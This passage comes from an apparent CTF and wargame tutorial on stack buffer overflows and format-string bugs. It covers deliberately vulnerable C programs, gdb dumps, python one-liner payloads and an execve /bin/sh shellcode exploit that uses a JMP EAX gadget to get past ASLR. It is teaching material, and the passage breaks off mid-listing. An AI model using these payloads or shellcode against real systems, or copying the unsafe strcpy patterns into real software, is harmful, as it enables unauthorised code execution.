</span><span class='line'>0xffffd8b4:   0x5f434c00  0x3d4c4c41  0x47450043  0x90903d47
</span><span class='line'>0xffffd8c4:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xffffd8d4:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xffffd8e4:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xffffd8f4:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xffffd904:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xffffd914:   0x90909090  0x90909090  0x99580b6a  0x2f2f6852
</span><span class='line'>0xffffd924:   0x2f686873  0x896e6962  0xcdc931e3  0x53550080
</span><span class='line'>0xffffd934:   0x6e3d5245  0x696e7261  0x4c003861  0x4f435f53
</span><span class='line'>0xffffd944:   0x53524f4c  0x3d73723d  0x69643a30  0x3b31303d</span></code></pre></td></tr></table></div></figure>

Let's redirect our program to 0xffffd8d4 to get the shell
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) run `python -c 'print "A"*20 + "\x28\xd8\xff\xff" + "A"*12 + "\xd4\xd8\xff\xff"'`
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? (y or n) y
</span><span class='line'>Starting program: /games/narnia/narnia8 `python -c 'print "A"*20 + "\x28\xd8\xff\xff" + "A"*12 + "\xd4\xd8\xff\xff"'`
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x080484a7 in func ()
</span><span class='line'>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>AAAAAAAAAAAAAAAAAAAA(���AAAAAAAAAAAA����(���
</span><span class='line'>process 19900 is executing new program: /bin/dash
</span><span class='line'>Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
</span><span class='line'>Error in re-setting breakpoint 1: No symbol "func" in current context.
</span><span class='line'>Error in re-setting breakpoint 1: No symbol "func" in current context.
</span><span class='line'>Error in re-setting breakpoint 1: No symbol "func" in current context.
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>

Trying this without gdb didn't work because the address of character array changes
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:/narnia$ ./narnia8 `python -c 'print "A"*20 + "\x28\xd8\xff\xff" + "B"*12 + "\xd4\xd8\xff\xff"'` 
</span><span class='line'>AAAAAAAAAAAAAAAAAAAA(A��
</span><span class='line'>narnia8@melinda:/narnia$ ./narnia8 `python -c 'print "A"*20 + "\x28\xd8\xff\xff" + "B"*12 + "\xd4\xd8\xff\xff"'` | hexdump
</span><span class='line'>0000000 4141 4141 4141 4141 4141 4141 4141 4141
</span><span class='line'>0000010 4141 4141 4128 ffff 0a02               
</span><span class='line'>000001a</span></code></pre></td></tr></table></div></figure>
Changing 28 to 0a just by chance gave me the correct address to be pointed at
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:/narnia$ ./narnia8 `python -c 'print "A"*20 + "\x0a\xd8\xff\xff" + "B"*12 + "\xd4\xd8\xff\xff"'` | hexdump
</span><span class='line'>0000000 4141 4141 4141 4141 4141 4141 4141 4141
</span><span class='line'>0000010 4141 4141 d837 ffff 0a03               </span></code></pre></td></tr></table></div></figure>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:/narnia$ ./narnia8 `python -c 'print "A"*20 + "\x37\xd8\xff\xff" + "B"*12 + "\xd4\xd8\xff\xff"'`          
</span><span class='line'>AAAAAAAAAAAAAAAAAAAA7���BBBBBBBBBBBB����7���
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>
</li>

<li>
For example, below you need the address of secret to write the new value 0x1337beef.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="kt">unsigned</span> <span class="n">secret</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="n">value</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">33</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Welcome! I will grant you one arbitrary write!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Where do you want to write to? &quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%p&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptr</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Okay! What do you want to write there? &quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%p&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">value</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Writing %p to %p...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">value</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">);</span>
</span><span class='line'>    <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Value written!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">secret</span> <span class="o">==</span> <span class="mh">0x1337beef</span><span class="p">){</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Woah! You changed my secret!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;I guess this means you get a flag now...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;flag.txt&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">fgets</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
</span><span class='line'>        <span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;My secret is still safe! Sorry.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
</li>

<li>In another challenge below, It can be easily seen the value of secret can be changed after entering 16 characters + 0xc0deface. As, 0xc0deface can't be printed as ASCII characters, you can use python to pass the input.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span> <span class="n">print</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\xc0\xde\xfa\xce</span><span class="s">&quot;</span><span class="err">&#39;</span> <span class="n">or</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span> <span class="n">print</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\xce\xfa\xde\xc0</span><span class="s">&quot;</span><span class="err">&#39;</span> <span class="n">based</span> <span class="n">on</span> <span class="n">the</span> <span class="n">endianess</span> <span class="n">of</span> <span class="n">the</span> <span class="n">system</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="kt">void</span> <span class="nf">give_shell</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh -i&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">secret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">secret</span> <span class="o">==</span> <span class="mh">0xc0deface</span><span class="p">){</span>
</span><span class='line'>        <span class="n">give_shell</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The secret is %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">secret</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>        <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></li>

<li>Controlling the EIP:
In the below challenge, an attacker can use a buffer overflow to take control of the program's execution. the return address for the call to vuln function is above buf on the stack, so it can be overwritten with an overflow. this allows an attacker to put nearly any address they desire in place of the return address. in this example, the goal is to call the give_shell function.
<ul>
<li>We need to find the address of give_shell function which can be done either by using gdb and print give_shell or objdump -d outputfile | grep give_shell.</li>
<li>To know the EIP offset, you can use cyclic patterns. Use  pattern_create.rb and pattern_offset.rb So pattern_create.rb 100 for instance will create a 100 byte cyclic pattern.</li>
<li>then you feed this as your input to the vulnerable program and it wil crash. so get the value of EIP at that point.</li>
<li>Then, we just need to pass the input to the program by ./a.out $(python -c ' print "A" * Offset + "Address of give_shell in hex"' )</li>
</ul>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* This never gets called! */</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">give_shell</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh -i&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>        <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></li>
<li> Execute Me:
If you check the below code, getegid() function shall return the effective group ID of the calling process., setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process.

If you see, read function read the stdin into the buffer and (function_ptf) buf() function is called which would call anything in the buffer.
<ul>
<li>Since, buf will execute anything, we need a shell code to fit in 128 bytes, There are plenty of shellcode (with different platforms and different working)which can be found on <a href="http://shell-storm.org/shellcode/">Shell-Storm</a>.</li>
<li>Then, we just need to pass the input to the program by ./a.out $(python -c ' print "A" * Offset + "Address of give_shell in hex"' )</li>
</ul>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="n">token</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">typedef</span> <span class="nf">void</span> <span class="p">(</span><span class="o">*</span><span class="n">function_ptr</span><span class="p">)();</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">be_nice_to_people</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">be_nice_to_people</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="p">((</span><span class="n">function_ptr</span><span class="p">)</span><span class="n">buf</span><span class="p">)();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></li>

<li> ROP1: This binary is running on a machine with ASLR! (Address space layout randomization (ASLR) is a computer security technique involved in protection from buffer overflow attacks.) Can you bypass it?

<ul>
<li>
From the code provided we can see that there’s a buffer overflow in the vuln() function due to the strcpy() call.  run the program within gdb and see what the state of the registers and the stack are at the time of the crash.
</li>
<li>From the cylic patterns tools, we could find that offset is at 76 which could be confirmed by providing a input of 76 “A”s and 4 “B”s to overwrite EIP. set a breakpoint after the call to strcpy(); that is *vuln+24. After the leave instruction is executed, EIP will be set to 0x424242.</li>
<li>EAX points to our buffer of “A”s and since the binary doesn’t have the NX bit, we can execute shellcode on the stack. To bypass ASLR, we just need to find an address that will do a JMP/CALL EAX and set that as our return address. msfelfscan can find a list of instructions to accomplish this:
</li>
<li>Since the binary is compiled for 32 bit, searching the shellcode in Shellstorm for Linux_x86 executing /bin/sh, we get 21 bytes shellcode by kernelpanic.</li>
<li> As EAX contains the 76*A + BBBB when the vuln function returns, we just need to find address which will execute JMP EAX, it can be found by msfelfscan -j eax binary_file</li>
<li>One more small but important observation is the number of NOPs, as our shellcode is 21 bytes and offset is 76 bytes and jmp is 4 bytes. So, 76 - 21 - 4 = 51.</li>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="n">code</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">jmpeax</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="mh">0x080483e7</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">51</span> <span class="o">+</span> <span class="n">code</span> <span class="o">+</span> <span class="n">jmpeax</span>
</span></code></pre></td></tr></table></div></figure>
</ul>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">be_nice_to_people</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="n">be_nice_to_people</span><span class="p">();</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>        <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></li>

</ol>


<h3>Format String Examples</h3>

<ol>

<li> Let's see a simple example of a format string vulnerabilty. <strong>Narnia5</strong>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">snprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">buffer</span><span class="p">[</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Change i&#39;s value from 1 -&gt; 500. &quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">==</span><span class="mi">500</span><span class="p">){</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;GOOD</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;No way...let me give you a hint!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;buffer : [%s] (%d)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
</span><span class='line'>  <span class="n">printf</span> <span class="p">(</span><span class="s">&quot;i = %d (%p)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">i</span><span class="p">);</span>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
Let's try to see what's on stack and if we can put something on stack and change the value of i.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
